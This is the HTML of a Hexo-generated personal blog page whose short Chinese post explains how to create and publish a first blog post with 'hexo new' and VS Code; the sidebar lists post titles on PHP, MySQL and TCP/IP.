<h1 id="开始写下自己的第一篇博客吧！"><a href="#开始写下自己的第一篇博客吧！" class="headerlink" title="开始写下自己的第一篇博客吧！"></a>开始写下自己的第一篇博客吧！</h1><p>第一步：在blog文件夹中打开cmd，输入命令：<br>hexo new “My-new-post”<br>会在/blog\source_posts生成一个My-new-post.md文件<br><img src="/img/34.png" alt="_config.yml"><br>第二步：打开VSC开始写下你的第一篇博客内容吧<br>第三步，把写好的东西保存好，本地查看一下，没有问题的话就可以上传同步喽  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/03/博客搭建/" data-id="cjq4hvb3m0007oonpee8gtd4p" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/12/25/TCPIP协议与HTTP协议/">TCP/IP协议与HTTP协议</a>
          </li>
        
          <li>
            <a href="/2018/12/22/mysql数据库基础知识笔记/">MySQL数据库基础知识笔记</a>
          </li>
        
          <li>
            <a href="/2018/12/20/PHP文件包含、cookie、文件上传/">PHP文件包含、cookie、文件上传</a>
          </li>
        
          <li>
            <a href="/2018/12/20/php表单+文件+代码、命令执行/">php表单+文件+代码、命令执行</a>
          </li>
        
          <li>
            <a href="/2018/12/16/PHP基础总结/">PHP基础总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>